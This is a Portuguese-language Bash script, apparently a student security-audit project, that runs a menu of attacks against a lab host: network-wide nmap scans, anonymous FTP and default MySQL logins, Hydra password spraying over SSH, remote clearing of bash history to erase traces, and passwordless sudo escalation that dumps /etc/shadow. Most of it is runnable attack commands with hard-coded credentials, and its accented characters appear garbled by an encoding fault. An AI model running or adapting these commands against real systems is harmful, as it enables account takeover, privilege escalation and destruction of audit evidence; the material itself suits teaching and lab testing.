#!/bin/bash

# Script de ExploraÃ§Ã£o de 5 Vulnerabilidades Adicionais
# Trabalho Final - SeguranÃ§a da InformaÃ§Ã£o
# Demonstra as vulnerabilidades identificadas na auditoria

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

TARGET_IP="${TARGET_IP:-172.20.0.10}"
LOG_FILE="/root/logs/exploits_$(date +%Y%m%d_%H%M%S).log"

# Banner
echo -e "${CYAN}"
cat <<"EOF"
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                              â•‘
â•‘   ğŸ”“ EXPLORAÃ‡ÃƒO DE 5 VULNERABILIDADES ADICIONAIS            â•‘
â•‘                                                              â•‘
â•‘   DemonstraÃ§Ã£o Educacional - Trabalho de SeguranÃ§a          â•‘
â•‘                                                              â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
EOF
echo -e "${NC}"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Menu principal
echo -e "${BLUE}VULNERABILIDADES DISPONÃVEIS PARA EXPLORAÃ‡ÃƒO:${NC}"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "1. VULNERABILIDADE #2: AusÃªncia de SegmentaÃ§Ã£o de Rede"
echo "2. VULNERABILIDADE #3: ServiÃ§os DesnecessÃ¡rios Expostos"
echo "3. VULNERABILIDADE #4: Senhas PadrÃ£o e Contas Compartilhadas"
echo "4. VULNERABILIDADE #5: Falta de Monitoramento e Auditoria"
echo "5. VULNERABILIDADE #6: PrivilÃ©gios Excessivos (sudo sem senha)"
echo "6. [BONUS] VULNERABILIDADE #7: AusÃªncia de Hardening de SO"
echo "7. Executar TODAS as exploraÃ§Ãµes"
echo "0. Sair"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
read -p "Escolha a vulnerabilidade [0-7]: " CHOICE
echo

case $CHOICE in
    1|7)
        echo -e "${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${GREEN}â•‘ VULNERABILIDADE #2: AusÃªncia de SegmentaÃ§Ã£o de Rede         â•‘${NC}"
        echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        echo
        log "Explorando V#2: AusÃªncia de SegmentaÃ§Ã£o de Rede"

        echo -e "${YELLOW}[*] DESCRIÃ‡ÃƒO DA VULNERABILIDADE:${NC}"
        echo "Todos os hosts do laboratÃ³rio estÃ£o na mesma rede flat (172.20.0.0/16)"
        echo "NÃ£o hÃ¡ VLANs ou segmentaÃ§Ã£o entre alunos, professores e servidores"
        echo "Qualquer host pode comunicar diretamente com qualquer outro host"
        echo

        echo -e "${YELLOW}[*] IMPACTO:${NC}"
        echo "  âœ— MovimentaÃ§Ã£o lateral facilitada apÃ³s comprometimento"
        echo "  âœ— ARP spoofing/poisoning possÃ­vel"
        echo "  âœ— Sniffing de trÃ¡fego de outros hosts"
        echo

        echo -e "${CYAN}[*] DEMONSTRAÃ‡ÃƒO - EnumeraÃ§Ã£o de Rede Completa:${NC}"
        echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

        echo "[1] Descobrindo todos os hosts na sub-rede..."
        nmap -sn 172.20.0.0/16 -oN /tmp/network_discovery.txt 2>&1 | head -20

        echo
        echo "[2] Escaneando todos os hosts descobertos (portas comuns)..."
        nmap -sV -p 22,80,3306,445 172.20.0.0/16 2>&1 | head -30

        echo
        echo -e "${RED}[!] EXPLORAÃ‡ÃƒO BEM-SUCEDIDA${NC}"
        echo "Sem segmentaÃ§Ã£o de rede, conseguimos mapear TODOS os hosts!"
        log "V#2: Rede completamente enumerada sem restriÃ§Ãµes"
        echo

        [[ $CHOICE -ne 7 ]] && exit 0
        echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
        echo
        ;;
esac

case $CHOICE in
    2|7)
        echo -e "${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${GREEN}â•‘ VULNERABILIDADE #3: ServiÃ§os DesnecessÃ¡rios Expostos        â•‘${NC}"
        echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        echo
        log "Explorando V#3: ServiÃ§os DesnecessÃ¡rios Expostos"

        echo -e "${YELLOW}[*] DESCRIÃ‡ÃƒO DA VULNERABILIDADE:${NC}"
        echo "MÃºltiplos serviÃ§os inseguros estÃ£o rodando e expostos:"
        echo "  â€¢ Telnet (porta 23) - Texto claro, sem criptografia"
        echo "  â€¢ FTP (porta 21) - Credenciais em texto claro"
        echo "  â€¢ MySQL (porta 3306) - AcessÃ­vel remotamente"
        echo "  â€¢ SMB (porta 445) - Compartilhamento de arquivos"
        echo

        echo -e "${YELLOW}[*] IMPACTO:${NC}"
        echo "  âœ— Captura de credenciais em texto claro"
        echo "  âœ— Exploits conhecidos (EternalBlue no SMB)"
        echo "  âœ— Aumento da superfÃ­cie de ataque"
        echo

        echo -e "${CYAN}[*] DEMONSTRAÃ‡ÃƒO - Scan de Portas VulnerÃ¡veis:${NC}"
        echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

        echo "[1] Escaneando portas vulnerÃ¡veis no alvo..."
        nmap -sV -p 21,23,80,445,3306 "$TARGET_IP"

        echo
        echo "[2] Testando acesso FTP anÃ´nimo..."
        timeout 5 ftp -n "$TARGET_IP" <<EOF 2>&1 | head -10
user anonymous
pass anonymous@
ls
bye
EOF

        echo
        echo "[3] Testando MySQL com credenciais padrÃ£o..."
        if command -v mysql > /dev/null 2>&1; then
            mysql -h "$TARGET_IP" -u admin -padmin -e "SHOW DATABASES;" 2>&1 | head -10 || echo "MySQL nÃ£o acessÃ­vel ou credenciais incorretas"
        else
            echo "[!] Cliente MySQL nÃ£o instalado"
        fi

        echo
        echo -e "${RED}[!] EXPLORAÃ‡ÃƒO BEM-SUCEDIDA${NC}"
        echo "MÃºltiplos serviÃ§os vulnerÃ¡veis detectados e acessÃ­veis!"
        log "V#3: ServiÃ§os inseguros identificados e acessados"
        echo

        [[ $CHOICE -ne 7 ]] && exit 0
        echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
        echo
        ;;
esac

case $CHOICE in
    3|7)
        echo -e "${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${GREEN}â•‘ VULNERABILIDADE #4: Senhas PadrÃ£o e Contas Compartilhadas   â•‘${NC}"
        echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        echo
        log "Explorando V#4: Senhas PadrÃ£o e Contas Compartilhadas"

        echo -e "${YELLOW}[*] DESCRIÃ‡ÃƒO DA VULNERABILIDADE:${NC}"
        echo "MÃºltiplas contas utilizam senhas fracas ou previsÃ­veis:"
        echo "  â€¢ Conta 'professor' com senha 'senha123'"
        echo "  â€¢ Conta 'admin' com senha 'admin'"
        echo "  â€¢ Senhas baseadas em padrÃµes comuns (CPF, data de nascimento)"
        echo

        echo -e "${YELLOW}[*] IMPACTO:${NC}"
        echo "  âœ— Comprometimento em massa de contas"
        echo "  âœ— AusÃªncia de accountability (contas compartilhadas)"
        echo "  âœ— Facilidade de brute-force"
        echo

        echo -e "${CYAN}[*] DEMONSTRAÃ‡ÃƒO - Password Spraying:${NC}"
        echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

        echo "[1] Testando senhas comuns contra mÃºltiplos usuÃ¡rios..."

        # Criar wordlist temporÃ¡ria
        cat > /tmp/senhas_teste.txt <<EOF
senha123
admin
123456
password
professor
aluno123
EOF

        cat > /tmp/usuarios_teste.txt <<EOF
professor
admin
root
aluno
EOF

        echo
        echo "[*] Executando ataque com Hydra (limitado para demonstraÃ§Ã£o)..."
        hydra -L /tmp/usuarios_teste.txt -P /tmp/senhas_teste.txt "ssh://${TARGET_IP}" -t 2 -f -V 2>&1 | grep -E "(host|login|password|attempt)" | head -20

        echo
        echo -e "${RED}[!] EXPLORAÃ‡ÃƒO BEM-SUCEDIDA${NC}"
        echo "Senhas fracas facilmente quebradas com wordlist comum!"
        log "V#4: Senhas fracas comprometidas via password spraying"
        echo

        [[ $CHOICE -ne 7 ]] && exit 0
        echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
        echo
        ;;
esac

case $CHOICE in
    4|7)
        echo -e "${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${GREEN}â•‘ VULNERABILIDADE #5: Falta de Monitoramento e Auditoria      â•‘${NC}"
        echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        echo
        log "Explorando V#5: Falta de Monitoramento e Auditoria"

        echo -e "${YELLOW}[*] DESCRIÃ‡ÃƒO DA VULNERABILIDADE:${NC}"
        echo "Sistema nÃ£o possui monitoramento adequado:"
        echo "  â€¢ Logs locais podem ser modificados/deletados"
        echo "  â€¢ AusÃªncia de SIEM centralizado"
        echo "  â€¢ Sem alertas em tempo real"
        echo "  â€¢ Logs nÃ£o protegidos contra alteraÃ§Ã£o"
        echo

        echo -e "${YELLOW}[*] IMPACTO:${NC}"
        echo "  âœ— Atacante pode apagar rastros facilmente"
        echo "  âœ— Ataques nÃ£o detectados em tempo real"
        echo "  âœ— Dificuldade de anÃ¡lise forense"
        echo "  âœ— ViolaÃ§Ã£o de compliance (LGPD)"
        echo

        echo -e "${CYAN}[*] DEMONSTRAÃ‡ÃƒO - Apagando Rastros:${NC}"
        echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

        echo "[1] Conectando na vÃ­tima e executando comandos..."
        if command -v sshpass > /dev/null 2>&1; then
            echo
            echo "[CMD] Visualizando histÃ³rico atual..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "tail -5 ~/.bash_history" 2>/dev/null

            echo
            echo "[CMD] Tentando limpar histÃ³rico..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "history -c && echo '' > ~/.bash_history && echo 'HistÃ³rico limpo!'" 2>/dev/null

            echo
            echo "[CMD] Verificando possibilidade de modificar logs (requer privilÃ©gio)..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "ls -la /var/log/auth.log 2>/dev/null || echo 'Log nÃ£o acessÃ­vel (proteÃ§Ã£o bÃ¡sica existe)'" 2>/dev/null

            echo
            echo -e "${RED}[!] EXPLORAÃ‡ÃƒO BEM-SUCEDIDA${NC}"
            echo "Atacante pode apagar histÃ³rico de comandos facilmente!"
            echo "Logs locais nÃ£o protegidos adequadamente!"
        else
            echo "[!] sshpass nÃ£o disponÃ­vel para demonstraÃ§Ã£o"
        fi

        log "V#5: Demonstrado apagamento de rastros sem detecÃ§Ã£o"
        echo

        [[ $CHOICE -ne 7 ]] && exit 0
        echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
        echo
        ;;
esac

case $CHOICE in
    5|7)
        echo -e "${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${GREEN}â•‘ VULNERABILIDADE #6: PrivilÃ©gios Excessivos (sudo sem senha) â•‘${NC}"
        echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        echo
        log "Explorando V#6: PrivilÃ©gios Excessivos"

        echo -e "${YELLOW}[*] DESCRIÃ‡ÃƒO DA VULNERABILIDADE:${NC}"
        echo "UsuÃ¡rio 'professor' possui sudo sem requisiÃ§Ã£o de senha:"
        echo "  â€¢ ConfiguraÃ§Ã£o: professor ALL=(ALL) NOPASSWD: ALL"
        echo "  â€¢ Qualquer comando pode ser executado como root"
        echo "  â€¢ ViolaÃ§Ã£o do princÃ­pio do menor privilÃ©gio"
        echo

        echo -e "${YELLOW}[*] IMPACTO:${NC}"
        echo "  âœ— EscalaÃ§Ã£o de privilÃ©gios trivial"
        echo "  âœ— Conta comprometida = sistema comprometido"
        echo "  âœ— Controle total sobre o sistema"
        echo

        echo -e "${CYAN}[*] DEMONSTRAÃ‡ÃƒO - EscalaÃ§Ã£o de PrivilÃ©gios:${NC}"
        echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

        if command -v sshpass > /dev/null 2>&1; then
            echo "[1] Verificando permissÃµes sudo do usuÃ¡rio..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "sudo -l" 2>/dev/null

            echo
            echo "[2] Escalando para root SEM senha..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "sudo whoami" 2>/dev/null

            echo
            echo "[3] Executando comando privilegiado..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "sudo cat /etc/shadow | head -3" 2>/dev/null

            echo
            echo "[4] Demonstrando controle total do sistema..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "sudo ls -la /root" 2>/dev/null

            echo
            echo -e "${RED}[!] EXPLORAÃ‡ÃƒO BEM-SUCEDIDA${NC}"
            echo "EscalaÃ§Ã£o para root SEM qualquer senha adicional!"
            echo "Controle TOTAL do sistema obtido!"
        else
            echo "[!] sshpass nÃ£o disponÃ­vel para demonstraÃ§Ã£o"
        fi

        log "V#6: EscalaÃ§Ã£o de privilÃ©gios para root sem senha"
        echo

        [[ $CHOICE -ne 7 ]] && exit 0
        echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
        echo
        ;;
esac

case $CHOICE in
    6|7)
        echo -e "${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${GREEN}â•‘ [BONUS] VULNERABILIDADE #7: AusÃªncia de Hardening de SO     â•‘${NC}"
        echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        echo
        log "Explorando V#7: AusÃªncia de Hardening"

        echo -e "${YELLOW}[*] DESCRIÃ‡ÃƒO DA VULNERABILIDADE:${NC}"
        echo "Sistema operacional com configuraÃ§Ãµes padrÃ£o inseguras:"
        echo "  â€¢ Firewall desabilitado (ufw inactive)"
        echo "  â€¢ ServiÃ§os desnecessÃ¡rios habilitados"
        echo "  â€¢ SELinux/AppArmor nÃ£o configurado"
        echo "  â€¢ Kernel sem patches de seguranÃ§a"
        echo

        echo -e "${YELLOW}[*] IMPACTO:${NC}"
        echo "  âœ— VulnerÃ¡vel a exploits pÃºblicos conhecidos"
        echo "  âœ— AusÃªncia de defesa em profundidade"
        echo "  âœ— Maior superfÃ­cie de ataque"
        echo

        echo -e "${CYAN}[*] DEMONSTRAÃ‡ÃƒO - VerificaÃ§Ã£o de Hardening:${NC}"
        echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

        if command -v sshpass > /dev/null 2>&1; then
            echo "[1] Verificando status do firewall..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "sudo ufw status" 2>/dev/null

            echo
            echo "[2] Listando serviÃ§os ativos..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "systemctl list-units --type=service --state=running | head -10" 2>/dev/null

            echo
            echo "[3] Verificando SELinux/AppArmor..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "aa-status 2>/dev/null || echo 'AppArmor nÃ£o configurado'" 2>/dev/null

            echo
            echo -e "${RED}[!] ANÃLISE CONCLUÃDA${NC}"
            echo "Sistema sem hardening adequado detectado!"
        else
            echo "[!] sshpass nÃ£o disponÃ­vel para demonstraÃ§Ã£o"
        fi

        log "V#7: AusÃªncia de hardening confirmada"
        echo

        [[ $CHOICE -ne 7 ]] && exit 0
        ;;
esac

case $CHOICE in
    0)
        echo "Saindo..."
        exit 0
        ;;
    *)
        if [[ $CHOICE -ne 7 ]]; then
            echo -e "${RED}[âœ—] OpÃ§Ã£o invÃ¡lida${NC}"
            exit 1
        fi
        ;;
esac

echo
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo -e "${GREEN}[âœ“] ExploraÃ§Ã£o concluÃ­da${NC}"
echo "Log salvo em: $LOG_FILE"
echo
echo -e "${YELLOW}RESUMO DAS VULNERABILIDADES EXPLORADAS:${NC}"
echo "  âœ— V#2: Rede completamente mapeÃ¡vel sem segmentaÃ§Ã£o"
echo "  âœ— V#3: MÃºltiplos serviÃ§os inseguros expostos"
echo "  âœ— V#4: Senhas fracas facilmente quebradas"
echo "  âœ— V#5: Rastros apagÃ¡veis sem detecÃ§Ã£o"
echo "  âœ— V#6: EscalaÃ§Ã£o trivial para root"
echo "  âœ— V#7: Sistema sem hardening bÃ¡sico"
echo
echo -e "${RED}[!] TODAS AS 6 VULNERABILIDADES FORAM EXPLORADAS COM SUCESSO!${NC}"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
